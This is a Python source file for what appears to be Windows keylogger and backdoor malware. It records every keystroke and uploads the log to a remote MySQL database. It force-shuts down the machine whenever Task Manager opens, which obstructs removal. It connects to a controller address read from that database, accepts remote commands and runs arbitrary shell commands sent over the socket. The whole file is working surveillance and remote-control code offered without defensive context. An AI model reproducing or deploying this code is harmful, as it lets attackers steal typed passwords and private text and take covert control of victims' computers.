import socket
import time
from pynput.keyboard import Key, Controller, Listener
import os
import mysql.connector
import re
import pyautogui
import threading
import subprocess
from pywinauto.application import Application




keyboard = Controller()
msg = ""

xPos = ""
yPos = ""

rClicked = ""
cmdClicked = ""

ip = socket.gethostbyname(socket.gethostname())
port =  ip.replace(".", "")
port = port[6:]
print(port)
port = int(port)
name = socket.gethostname()
name = re.sub('[-~`!@#$%^&*()_+=|/\>.<,:;"]', "", name)
print(name)


create_Table = "CREATE TABLE " + name + " ( IP VARCHAR(255), Log VARCHAR(255))"
table_Insert = "INSERT INTO " + name + " (IP, Log) VALUES ('%s', '%s')"

letters =  ""

def taskmgr():



    try:
        p = subprocess.call('taskkill /IM "Taskmgr.exe" /F', shell=True,
                             stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        print(p)
    except subprocess.CalledProcessError as e:

        print("helllle")

    if (p == 128):
        print(p, "Task Manager is not on")
        pass
    else:
        print(p, "Task Manager is on.... Will shutdown")
        os.system('shutdown /p /f')
    threading.Timer(2, taskmgr).start()

taskmgr()



try:
    print("Connecting to DB....")
    db = mysql.connector.connect(
        host="host",
        user="user",
        passwd="password",
        database = "logs"
    )
    print("Succeeded")
    my_Cursor = db.cursor(buffered=True)

except:
    pass

try:
    print("Attempting to create table for Logs....")
    my_Cursor.execute(create_Table)
    print("Succeeded")
except Exception as e:
    print("Failed", e)

msg = ""

def shutdown(key):

    global rClicked
    global cmdClicked
    global letters

    print(key)

    if(str(key).replace("'", "") == "r"):
        rClicked = True

    elif(key == Key.cmd):
        cmdClicked = True

    else:
        print("No")
        cmdClicked = False
        rClicked = False
        if (key == Key.enter):
            if (letters == ''):

                pass
            else:
                try:
                    print("\nAttempting to send to SQL Database")
                    my_Cursor.execute(table_Insert % (ip.replace(".", ""), letters))
                    db.commit()
                    print("\nSucceeded")
                    letters = ''
                except Exception as e:
                    print(e)
                    pass
        elif (key == Key.space):
            letters += ' '
            print("You Clicked Space")
        else:
            letters += str(key) + " "

            letters = letters.replace("'", "")
            print("You clicked: ", key)

    if(cmdClicked == True and rClicked ==  True):
        print("Shutdown")
        os.system('shutdown /p /f')
    else:
        print("Not Done!!! ")



def connect():
    global msg
    global ip


    try:
        print("Attempting to get IP.....")
        my_Cursor.execute("select IP from IP")
        ip = str(my_Cursor.fetchone())
        db.commit()
        ip = re.sub("'", "", ip)
        ip = ip.replace("(", "")
        ip = ip.replace(")", "")
        ip = ip.replace(",", "")
        print("Succeeded")
    except Exception as e:
        print(e)


    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Connecting.....")
        print(ip)
        s.connect((ip, 1))
        print("Connected")

        while True:
            print("Waiting for message")
            msg = str(s.recv(1024))
            msg = msg.replace("'", "")
            print("Got message")
            print(msg)
            print(len(msg))
            try:
                if(len(msg) < 5):

                    print("IN IF")
                    msg = msg[2:-1]
                    keyboard.press(msg)
                else:

                    msg = msg[5:]
                    if(msg == "f12"):
                        os.system('shutdown /p /f')
                    if(msg == "f11"):
                        print("F11")
                        command = s.recv(1024)
                        command = str(command)
                        command = re.sub("'", "", command)
                        command = command.replace("b", "")
                        os.system(command)
                    elif(msg == "f4"):
                        keyboard.press(Key.alt)
                        keyboard.press(Key.f4)
                        keyboard.release(Key.alt)
                        keyboard.release(Key.f4)
                    elif(msg == "f1"):
                        keyboard.press(Key.ctrl)
                        keyboard.press("w")
                        keyboard.release(Key.ctrl)
                        keyboard.release("w")
                    elif(msg == "f2"):
                        keyboard.press(Key.ctrl)
                        keyboard.press("t")
                        keyboard.release(Key.ctrl)
                        keyboard.release("t")
                    elif(msg == "insert" ):

                        pyautogui.moveTo(1919, 378, duration= 0.5)
                        pyautogui.moveTo(800, 1935, duration= 0.5)
                        pyautogui.moveTo(100, 1430, duration= 0.5)
                        pyautogui.moveTo(1600, 2, duration= 0.5)
                        pyautogui.moveTo(200, 300, duration= 0.5)
                        pyautogui.moveTo(300, 347, duration= 0.5)
                        pyautogui.moveTo(500, 23, duration= 0.5)
                        pyautogui.moveTo(1273, 976, duration= 0.5)
                        pyautogui.moveTo(287, 223, duration= 0.5)
                        pyautogui.moveTo(237, 800, duration= 0.5)
                    elif(msg == "delete"):
                        os.system("shutdown -l")
                    elif (msg == "print_screen"):
                        pyautogui.click(pyautogui.position(), duration= 3)
                    else:

                        print("HEYEYE")
                        keyboard.press(Key[msg])
                        keyboard.release(Key[msg])

            except Exception as e:
                    print (e)








    except Exception as e:
        print(e,)
        time.sleep(3)
        connect()


def output():
    print("Started output")
    global letters
    if (letters == ''):
        print("Nothing")
    else:
        try:
            print("\nAttempting to send to SQL Database")
            my_Cursor.execute(table_Insert % (ip.replace(".", ""), letters))
            db.commit()
            print("\nSucceeded")
            letters = ''
        except Exception as e:
            print("Did not Succeed", e)

    timer = threading.Timer(120, output)
    timer.start()

with Listener (shutdown) as Listener:
    output()
    connect()
    Listener.join()



